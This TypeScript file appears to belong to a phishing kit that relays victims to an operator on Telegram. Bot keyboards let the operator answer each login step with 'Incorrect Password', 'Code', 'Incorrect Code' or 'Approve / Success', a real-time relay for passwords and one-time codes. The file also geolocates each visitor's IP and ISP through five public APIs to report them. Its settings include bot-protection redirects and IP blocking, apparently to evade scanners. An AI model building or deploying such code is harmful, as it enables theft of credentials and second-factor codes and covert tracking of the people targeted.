// Telegram integration - uses backend API routes (works with both Express server and Netlify Functions)

declare global {
  interface Window {
    APP_CONFIG?: {
      ENABLE_BOT_PROTECTION?: boolean;
      BOT_REDIRECT_URL?: string;
      REPLIT_API_URL?: string;
    };
  }
}

export const getHumanVisitKeyboard = (ip?: string) => {
  return {
    inline_keyboard: [
      [
        { text: "Block IP", callback_data: `block-ip:${ip || 'unknown'}` },
        { text: "Unblock IP", callback_data: `unblock-ip:${ip || 'unknown'}` }
      ]
    ]
  };
};

export const getHomeKeyboard = (ip?: string, isBlocked?: boolean) => {
  return {
    inline_keyboard: [
      [
        { text: "Incorrect Password", callback_data: "error-password" },
        { text: "Code", callback_data: "next-code" }
      ],
      [
        { text: "Block IP", callback_data: `block-ip:${ip || 'unknown'}` },
        { text: "Unblock IP", callback_data: `unblock-ip:${ip || 'unknown'}` }
      ]
    ]
  };
};

export const getCodeKeyboard = (ip?: string, isBlocked?: boolean) => {
  return {
    inline_keyboard: [
      [
        { text: "Incorrect Code", callback_data: "incorrect-code" },
        { text: "Approve / Success", callback_data: "success" }
      ]
    ]
  };
};


export const getAdminKeyboard = () => {
  return getHomeKeyboard();
};

// Fetch user location for tracking - 5 fallback APIs
export const getUserLocationString = async (): Promise<string> => {
  // 1. ipapi.co
  try {
    const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
    if (res.ok) {
      const data = await res.json();
      if (data.ip) {
        return `<b>Location:</b> ${data.city}, ${data.country_name} (${data.country_code})
<b>IP:</b> ${data.ip}
<b>ISP:</b> ${data.org}`;
      }
    }
  } catch (e) { console.log('ipapi.co failed'); }

  // 2. ipwho.is
  try {
    const res = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(5000) });
    if (res.ok) {
      const data = await res.json();
      if (data.success && data.ip) {
        return `<b>Location:</b> ${data.city}, ${data.country} (${data.country_code})
<b>IP:</b> ${data.ip}
<b>ISP:</b> ${data.connection?.isp || 'Unknown'}`;
      }
    }
  } catch (e) { console.log('ipwho.is failed'); }

  // 3. ipinfo.io
  try {
    const res = await fetch('https://ipinfo.io/json', { signal: AbortSignal.timeout(5000) });
    if (res.ok) {
      const data = await res.json();
      if (data.ip) {
        return `<b>Location:</b> ${data.city}, ${data.country}
<b>IP:</b> ${data.ip}
<b>ISP:</b> ${data.org || 'Unknown'}`;
      }
    }
  } catch (e) { console.log('ipinfo.io failed'); }

  // 4. ip-api.com (HTTP only)
  try {
    const res = await fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(5000) });
    if (res.ok) {
      const data = await res.json();
      if (data.status === 'success') {
        return `<b>Location:</b> ${data.city}, ${data.country} (${data.countryCode})
<b>IP:</b> ${data.query}
<b>ISP:</b> ${data.isp}`;
      }
    }
  } catch (e) { console.log('ip-api.com failed'); }

  // 5. api.ipify.org
  try {
    const ipRes = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) });
    if (ipRes.ok) {
      const ipData = await ipRes.json();
      if (ipData.ip) {
        return `<b>IP:</b> ${ipData.ip}`;
      }
    }
  } catch (e) { console.log('ipify.org failed'); }

  return "Location: Unknown";
};

// Check if we're on Netlify - checks for netlify.app domain or .netlify/functions path availability
const isOnNetlify = () => {
  if (typeof window === 'undefined') return false;
  const hostname = window.location.hostname;
  return hostname.includes('netlify.app') || 
         hostname.includes('netlify.com') || 
         hostname.includes('netlify');
};

// Determine API base path (works for both Express and Netlify Functions)
const getApiPath = (endpoint: string) => {
  const isNetlify = isOnNetlify();
  
  if (isNetlify) {
    const configReplitUrl = window.APP_CONFIG?.REPLIT_API_URL;
    const storageReplitUrl = localStorage.getItem('REPLIT_API_URL');
    const replitUrl = configReplitUrl || storageReplitUrl || '';
    
    if (replitUrl) {
      const base = replitUrl.endsWith('/') ? `${replitUrl}api/telegram/` : `${replitUrl}/api/telegram/`;
      return `${base}${endpoint}`;
    }
    return `/.netlify/functions/telegram-${endpoint}`;
  }
  return `/api/telegram/${endpoint}`;
};

export const sendTelegramMessage = async (text: string, keyboard?: any) => {
  const requestBody = JSON.stringify({ text, keyboard });
  const headers = { "Content-Type": "application/json" };
  const apiPath = getApiPath('send');

  try {
    const response = await fetch(apiPath, {
      method: "POST",
      headers,
      body: requestBody,
    });

    if (response.ok) {
      const data = await response.json();
      return data.ok;
    }
    return false;
  } catch (error) {
    console.error("Failed to send Telegram message:", error);
    return false;
  }
};

export const checkTelegramUpdates = async (offset: number = 0) => {
  try {
    // Use Netlify functions directly if on Netlify
    if (isOnNetlify()) {
      const response = await fetch(`/.netlify/functions/telegram-updates?offset=${offset}`);
      if (response.ok) {
        return await response.json();
      }
      return null;
    }

    // Express backend with Netlify fallback
    let response = await fetch(`/api/telegram/updates?offset=${offset}`);

    if (response.status === 404 || !response.ok) {
      response = await fetch(`/.netlify/functions/telegram-updates?offset=${offset}`);
    }

    if (response.ok) {
      return await response.json();
    }
    return null;
  } catch (error) {
    return null;
  }
};

export const flushPendingUpdates = async () => {
  try {
    // Use Netlify functions directly if on Netlify
    if (isOnNetlify()) {
      const response = await fetch('/.netlify/functions/telegram-flush', { method: 'POST' });
      if (response.ok) {
        const data = await response.json();
        return data?.updateId || 0;
      }
      return 0;
    }

    // Express backend with Netlify fallback
    let response = await fetch('/api/telegram/flush', { method: 'POST' });

    if (response.status === 404 || !response.ok) {
      response = await fetch('/.netlify/functions/telegram-flush', { method: 'POST' });
    }

    if (response.ok) {
      const data = await response.json();
      return data?.updateId || 0;
    }
    return 0;
  } catch (e) {
    return 0;
  }
};

export const checkTelegramStatus = async () => {
  try {
    // Use Netlify functions directly if on Netlify
    if (isOnNetlify()) {
      const response = await fetch('/.netlify/functions/telegram-status');
      if (response.ok) {
        const data = await response.json();
        return data?.configured || false;
      }
      return false;
    }

    // Express backend with Netlify fallback
    let response = await fetch('/api/telegram/status');

    if (response.status === 404 || !response.ok) {
      response = await fetch('/.netlify/functions/telegram-status');
    }

    if (response.ok) {
      const data = await response.json();
      return data?.configured || false;
    }
    return false;
  } catch (e) {
    return false;
  }
};
